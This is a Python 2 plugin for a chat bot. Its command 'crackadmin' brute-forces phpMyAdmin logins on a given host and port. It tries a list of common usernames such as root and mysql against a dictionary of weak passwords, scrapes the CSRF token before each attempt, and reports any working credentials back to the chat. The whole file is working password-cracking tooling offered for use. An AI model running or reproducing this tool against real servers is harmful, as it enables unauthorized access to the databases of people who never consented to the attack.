# coding:utf-8
import urllib2
import re
import threading

def check(ip, port, timeout,msg):
    flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">',
                 'class="disableAjax" title=']
    user_list = ['root', 'mysql', 'www', 'bbs', 'wwwroot', 'bak', 'backup']
    error_i = 0
    try:
        res_html = urllib2.urlopen('http://' + ip + ":" + str(port), timeout=timeout).read()
        if 'input_password' in res_html and 'name="token"' in res_html:
            url = 'http://' + ip + ":" + str(port) + "/index.php"
        else:
            res_html = urllib2.urlopen('http://' + ip + ":" + str(port) + "/phpmyadmin", timeout=timeout).read()
            if 'input_password' in res_html and 'name="token"' in res_html:
                url = 'http://' + ip + ":" + str(port) + "/phpmyadmin/index.php"
            else:
                return
    except:
        pass
    PASSWORD_DIC = ['alpine',
                    'ohshit',
                    '%null%',
                    '000000',
                    '111111',
                    '11111111',
                    '112233',
                    '123123',
                    '123321',
                    '12345',
                    '123456',
                    '1234567',
                    '12345678',
                    '654321',
                    '666666',
                    '888888',
                    'abcdef',
                    'abcabc',
                    'abc123',
                    'a1b2c3',
                    'aaa111',
                    '123qwe',
                    'qwerty',
                    'qweasd',
                    'admin',
                    'password',
                    'p@ssword',
                    'passwd',
                    'iloveyou',
                    '5201314',
                    'dragon']
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
                res_html = opener.open(url, timeout=timeout).read()
                token = re.search('name="token" value="(.*?)" />', res_html)
                token_hash = urllib2.quote(token.group(1))
                postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                user, password, token_hash)
                res = opener.open(url,postdata, timeout=timeout)
                res_html = res.read()
                for flag in flag_list:
                    if flag in res_html:
                        msg.Reply('%s phpmyadmin弱口令，账号：%s 密码：%s' % (ip,user, password))
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3:
                    msg.Reply('扫描异常结束')
                    return
            except Exception,e:
                msg.Reply('扫描异常结束')
                return
    msg.Reply(ip + ' 扫描结束')

def work(msg,info):
    msg.content = msg.content.strip()
    if msg.content.startswith("crackadmin"):
        if not info.get('level', 3) < 3:
            return False
        try:
            host = msg.content.split(' ', 1)[-1]
            port = '80'
            if host.count(' '):
                port = host.split(' ')[-1]
                host = host.split(' ')[0]
            threading.Thread(target=check, args=(host, int(port), 5, msg)).start()
            return '已经添加扫描任务'
        except:
            return help(info)
    else:
        return False


def help(info):
    if not info.get('level',3) < 3:
        return False
    return '#crackadmin a.com [port]  用于爆破phpmyadmin'
